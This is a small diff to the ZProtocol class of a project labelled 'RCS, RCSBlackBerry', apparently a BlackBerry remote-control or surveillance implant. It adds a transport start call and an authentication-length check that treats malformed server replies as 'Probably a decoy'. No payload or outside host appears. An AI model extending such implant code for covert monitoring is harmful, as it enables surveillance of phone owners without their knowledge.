@@ -6,7 +6,7 @@
  * 
  * Project      : RCS, RCSBlackBerry
  * *************************************************/
-	
+
 package blackberry.action.sync.protocol;
 
 import java.io.EOFException;
@@ -69,6 +69,9 @@ public class ZProtocol extends Protocol {
         //#endif
 
         try {
+            
+            transport.start();
+            
             //#ifdef DEBUG
             debug.info("***** Authentication *****");
             //#endif          
@@ -236,11 +239,13 @@ public class ZProtocol extends Protocol {
 
     protected void parseAuthentication(byte[] authResult)
             throws ProtocolException {
-        //#ifdef DBC
-        Check.ensures(authResult.length == 64, "authResult.length="
-                + authResult.length);
-        //#endif
-
+        if(authResult.length != 64){
+            //#ifdef DEBUG
+            debug.trace("parseAuthentication: wrong size. Probably a decoy.");
+            //#endif
+            throw new ProtocolException(14);
+        }
+               
         //#ifdef DEBUG
         debug.trace("decodeAuth result = " + Utils.byteArrayToHex(authResult));
         //#endif
